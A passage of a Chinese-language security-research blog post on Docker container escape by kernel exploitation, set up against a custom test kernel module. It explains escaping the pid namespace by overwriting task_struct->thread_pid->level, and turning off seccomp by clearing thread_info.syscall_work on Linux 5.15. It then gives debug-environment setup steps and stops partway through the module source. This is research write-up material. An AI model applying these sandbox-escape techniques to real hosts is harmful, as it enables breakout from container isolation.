aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在  <code>struct pid</code> 结构体中，目前只需关注 count、level、numbers[1] 这三个成员：</p>
<ul>
<li><code>count</code>：pid namespace计数，表示可以看到该进程的namespace个数。一个Docker进程，本质上也是host的一个进程，所以一个进程可能存在于多个namespace中，从不同namespace中看到会看到不同的进程信息。比如在Docker中pid为10的进程，在host上它对应pid为3000。</li>
<li><code>level</code>：表示进程当前所在的层级，host的level为0。当在host上起一个Docker时，Docker进程的level为1。如果在Docker中再起一个Docker，那么新Docker中进程的level为2，以此类推。</li>
<li><code>numbers[1]</code>：变长的<code>struct upid</code>结构体数组，用于存放不同level中该进程的 pid 信息。</li>
</ul>
<p>所以，该结构体中 level 成员的值表明当前进程在哪个 pid namespace中，只需该掉该值便可完成 pid namespace 的逃逸。</p>
<p>实际测试中，将 level 改完后，再通过 <code>setns()</code> 设置 pid namespace，<code>/proc/$$/ns/pid_ns_for_children</code> 和 <code>/proc/$$/ns/pid</code> 都被更改成功，直接逃到 host 的 pid namespace 中，如下图：</p>
<p><img decoding="async" loading="lazy" src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/7419a223-22f4-4c1a-81ee-0649b4f6c3da-d3d393e509c85dd6f4ddf3b115e8db05.png" width="2170" height="839" class="img_ev3q"></p>
<p>此时可 kill 任意 host 进程：</p>
<p><img decoding="async" loading="lazy" src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/2d652f8b-0d19-4ce4-bcf5-ce91a6964776-cc5b2554a628feb87aedb8001416f033.png" width="1857" height="173" class="img_ev3q"></p>
<p>所以，逃逸 pid namespace 只需更改进程 <code>task_struct-&gt;thread_pid-&gt;level</code> 的值。</p>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="45-较少被提及的-seccomp">4.5 较少被提及的 seccomp<a href="https://tiangonglab.github.io/blog/tiangongarticle030#45-%E8%BE%83%E5%B0%91%E8%A2%AB%E6%8F%90%E5%8F%8A%E7%9A%84-seccomp" class="hash-link" aria-label="4.5 较少被提及的 seccomp的直接链接" title="4.5 较少被提及的 seccomp的直接链接">​</a></h3>
<p>实际上，现在 Docker 的默认启动配置并不存在 CAP_SYS_ADMIN 权限，并且 seccomp 默认规则也会禁止进程调用 <code>setns()</code> 来切换 namespace。所以在写内核利用时需考虑绕过这两点的限制，CAP_SYS_ADMIN 可以通过更改进程 <code>task_struct-&gt;cred</code> 来完成，而 seccomp 的限制应如何绕过呢？</p>
<p>在 CVE-2017-1000112 的 <a href="https://github.com/hikame/docker_escape_pwn/tree/master" target="_blank" rel="noopener noreferrer">exp</a> 中看到一种绕过seccomp的方法：</p>
<p><img decoding="async" loading="lazy" src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/e74c6ab2-190c-4375-830e-6739c4c06d01-babce8d6abc0219f2bb316dea456d731.png" width="1451" height="290" class="img_ev3q"></p>
<p>他通过将 task_struct 中 seccomp 结构体中的 mode 和 filter_count 两个成员清零的方式来绕过seccomp。</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">seccomp</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> mode</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"> </span><span class="token class-name">atomic_t</span><span class="token plain"> filter_count</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">seccomp_filter</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">filter</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>但是在我的环境中（Linux Kernel 5.15.0），将这两个值清零后，进程会 segmentation fault。所以直接更改这个结构体的内容，显然不可行。那么，除了 <code>struct seccomp</code> 结构体可以存放 seccomp 的状态及 filter 规则，有没有类似可以控制 seccomp 的开关呢？</p>
<p><a href="https://keksite.in/posts/Seccomp-Bypass/" target="_blank" rel="noopener noreferrer">一些资料</a> 中提供的方法是改进程 <code>current-&gt;thread_info.flags</code> ，这个 flags 会标记当前进程是否启用seccomp。而在 Linux 5.15.0 环境中，更改进程 <code>thread_info.flags</code>，未能关闭seccomp。该版本<code>struct thread_info</code> 的定义如下：</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">task_struct</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token macro property directive-hash" style="color: rgb(54, 172, 170);">#</span><span class="token macro property directive keyword" style="color: rgb(0, 0, 159);">ifdef</span><span class="token macro property" style="color: rgb(54, 172, 170);"> </span><span class="token macro property expression" style="color: rgb(54, 172, 170);">CONFIG_THREAD_INFO_IN_TASK</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">thread_info</span><span class="token plain">  thread_info</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token macro property directive-hash" style="color: rgb(54, 172, 170);">#</span><span class="token macro property directive keyword" style="color: rgb(0, 0, 159);">endif</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">thread_info</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">long</span><span class="token plain">  flags</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* low level flags */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">long</span><span class="token plain">  syscall_work</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"> </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* SYSCALL_WORK_ flags */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    u32   status</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* thread synchronous flags */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>有没有可能标记seccomp的flag位置变了？那这个flag是在何时设置的呢？</p>
<p>于是跟踪 seccomp 系统调用定位 seccomp 开关设置的位置，流程为<code>do_seccomp() -&gt; seccomp_set_mode_filter()-&gt; seccomp_assign_mode()</code>  。</p>
<p>基于此信息，结合 Linux 5.15.0 的内核源码和内核ELF文件定位到该版本设置flags的位置，发现它把 task_struct+8 位置的1个字节写成了1，所以可以确定当前内核版本中 <code>current-&gt;thread_info.syscall_work</code> 是设置 seccomp 的开关。</p>
<p><img decoding="async" loading="lazy" src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/9cded019-132e-4b55-bce8-f9bbd62cfef8-481a4a0a090df3c5e459030bb726f2e8.png" width="1176" height="670" class="img_ev3q"></p>
<p>调试查看开启seccomp和未开启seccomp的进程其 task_struct 结构体，发现确实是偏移 0x8 的位置处存放的值不一样。</p>
<p><img decoding="async" loading="lazy" src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/18a99460-3bde-4113-836a-23e0e5b1dd67-099219f97c15af3fbba1db486fcfeef2.png" width="1439" height="330" class="img_ev3q"></p>
<p>所以只需将该值（<code>current-&gt;thread_info.syscall_work</code>）设置成0，便可绕过seccomp的限制。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="五总结">五、总结<a href="https://tiangonglab.github.io/blog/tiangongarticle030#%E4%BA%94%E6%80%BB%E7%BB%93" class="hash-link" aria-label="五、总结的直接链接" title="五、总结的直接链接">​</a></h2>
<p>本文在 <code>Linux 5.15.0 + Docker 24.0.6</code> 环境中，基于一个自定义的内核ko，从Linux内核漏洞利用的角度，探索了Docker逃逸需要突破的内核安全机制 —— capability、namespace和seccomp。给出了公开利用中 pid namespace 切换失败的原因及解决方法，以及定位不同系统中进程 seccomp 开关位置的方法。</p>
<p>文末附了详细的环境搭建教程，感兴趣可以搭建调试，如有疑问，欢迎讨论~</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="六参考文章">六、参考文章<a href="https://tiangonglab.github.io/blog/tiangongarticle030#%E5%85%AD%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0" class="hash-link" aria-label="六、参考文章的直接链接" title="六、参考文章的直接链接">​</a></h2>
<p><a href="https://wiki.teamssix.com/cloudnative/docker/docker-escape-vulnerability-summary.html" target="_blank" rel="noopener noreferrer">Docker 逃逸漏洞汇总</a></p>
<p><a href="https://web.archive.org/web/20190411052819/https://capsule8.com/blog/practical-container-escape-exercise/" target="_blank" rel="noopener noreferrer">An Exercise in Practical Container Escapology</a></p>
<p><a href="https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation" target="_blank" rel="noopener noreferrer">The Route to Root: Container Escape Using Kernel Exploitation</a></p>
<p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf" target="_blank" rel="noopener noreferrer">A Compendium of Container Escapes</a></p>
<p><a href="https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/writeup.md#escaping-the-container-and-popping-a-root-shell" target="_blank" rel="noopener noreferrer">CVE-2021-22555: Turning \x00\x00 into 10000$</a></p>
<p><a href="https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-2/" target="_blank" rel="noopener noreferrer">Container security fundamentals part 2: Isolation &amp; namespaces</a></p>
<p><a href="http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2019/02/04/seccomp" target="_blank" rel="noopener noreferrer">Anatomy of the seccomp</a></p>
<p><a href="https://sunichi.github.io/2020/07/29/PID-NS/" target="_blank" rel="noopener noreferrer">PID Namespace</a></p>
<p><a href="https://blog.csdn.net/MachineGunJoe/article/details/117777910" target="_blank" rel="noopener noreferrer">22岁精神小伙居然利用 Linux 内核漏洞实现 Docker 逃逸！！</a></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="七附环境搭建">七、附：环境搭建<a href="https://tiangonglab.github.io/blog/tiangongarticle030#%E4%B8%83%E9%99%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA" class="hash-link" aria-label="七、附：环境搭建的直接链接" title="七、附：环境搭建的直接链接">​</a></h2>
<blockquote>
<p>基础环境：vmware workstation</p>
<p>被调试机：ubuntu 20.04虚拟机 + Docker version 24.0.6</p>
<p>调试机：ubuntu 18.04虚拟机 + gdb</p>
</blockquote>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="71-设置调试环境">7.1 设置调试环境<a href="https://tiangonglab.github.io/blog/tiangongarticle030#71-%E8%AE%BE%E7%BD%AE%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83" class="hash-link" aria-label="7.1 设置调试环境的直接链接" title="7.1 设置调试环境的直接链接">​</a></h3>
<ul>
<li>
<p>开启vmware虚拟机的调试模式：</p>
<p>找到 ubuntu20.04 的所在目录，在vmx文件中添加如下两行</p>
<div class="language-plain codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plain codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">debugStub.listen.guest64 = "TRUE"</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">debugStub.listen.guest64.remote = "TRUE"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>重启 ubuntu 20.04 这台虚拟机，在 host windows 上可以看到新监听了一个端口 —— 8864。</p>
</li>
<li>
<p>关闭系统KASLR</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">su root</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">vim /boot/grub/grub.cfg  # 在对应内核的启动项中添加 nokaslr</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">reboot</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">cat /proc/cmdline   # 重启后，在启动参数中可以看到 nokaslr 字样</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p>为了方便调试，我们还需要获取 ubuntu 20.04 的内核文件，并使用 vmlinux-to-elf 工具恢复部分符号</p>
<p>操作如下：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">$ uname -a </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">Linux ubuntu2004 5.15.0-102-generic #112~20.04.1-Ubuntu SMP Thu Mar 14 14:28:24 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">$ su root &amp;&amp; cd /home/bling/Desktop/</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"># cp /boot/vmlinuz-5.15.0-101-generic ./</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"># chown 1000:1000 ./vmlinuz-5.15.0-101-generic</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"># exit</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">$ chmod 666 ./vmlinuz-5.15.0-101-generic</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">$ vmlinux-to-elf ./vmlinuz-5.15.0-101-generic ./vmlinuz-5.15.0-101-generic.elf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="切换自动换行" title="切换自动换行"><svg viewBox="0 0 24 24" class="wordWrapButtonIcon_Bwma" aria-hidden="true"><path fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>获得的 vmlinuz-5.15.0-101-generic.elf 文件是我们一会儿 gdb 调试时需要用到的。</p>
</li>
<li>
<p>在调试机 ubuntu18.04 中，通过 gdb 指定 ip 和 port 即可调试 ubuntu 20.04 的内核</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">$ gdb</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">gef➤  file ./vmlinuz-5.15.0-101-generic.elf  # 提前将上一步的文件拷贝到调试机18.04中</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">gef➤  target remote 192.168.133.1:8864</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">gef➤  c</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="切换自动换行" title="切换自动换行"><svg viewBox="0 0 24 24" class="wordWrapButtonIcon_Bwma" aria-hidden="true"><path fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
</ul>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="72-创建docker">7.2 创建Docker<a href="https://tiangonglab.github.io/blog/tiangongarticle030#72-%E5%88%9B%E5%BB%BAdocker" class="hash-link" aria-label="7.2 创建Docker的直接链接" title="7.2 创建Docker的直接链接">​</a></h3>
<ul>
<li>
<p>写Dockerfile</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">mkdir Docker &amp;&amp; cd Docker</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">vim app.sh</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"># #!/bin/bash</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"># echo "Hello World!"</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">vim Dockerfile</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"># FROM ubuntu:18.04</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"># COPY ./app.sh /app</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"># RUN touch /app/aaa</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"># CMD sh /app/app.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p>生成image</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">Docker build -t testDocker .</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p>起 Docker shell</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">Docker run --rm -it testDocker bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
</ul>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="73-编译测试ko">7.3 编译测试ko<a href="https://tiangonglab.github.io/blog/tiangongarticle030#73-%E7%BC%96%E8%AF%91%E6%B5%8B%E8%AF%95ko" class="hash-link" aria-label="7.3 编译测试ko的直接链接" title="7.3 编译测试ko的直接链接">​</a></h3>
<ul>
<li>
<p>检查 <code>/lib/modules/$(uname -r)/build/</code> 目录下，是否存在当前内核版本头文件的软件包。没有的话通过 <code>sudo apt install linux-headers-$(uname -r)</code> 进行安装。</p>
</li>
<li>
<p>准备好 hello.c 和 Makefile文件，并编译ko</p>
<p>hello.c 会在dev目录下创建一个设备节点hellodev，用户态通过 <code>open("/dev/hellodev", 2)</code> 打开使用。</p>
<p>hello.c 文件如下：</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// hello.c</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token macro property directive-hash" style="color: rgb(54, 172, 170);">#</span><span class="token macro property directive keyword" style="color: rgb(0, 0, 159);">include</span><span class="token macro property" style="color: rgb(54, 172, 170);"> </span><span class="token macro property string" style="color: rgb(227, 17, 108);">&lt;linux/module.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token macro property directive-hash" style="color: rgb(54, 172, 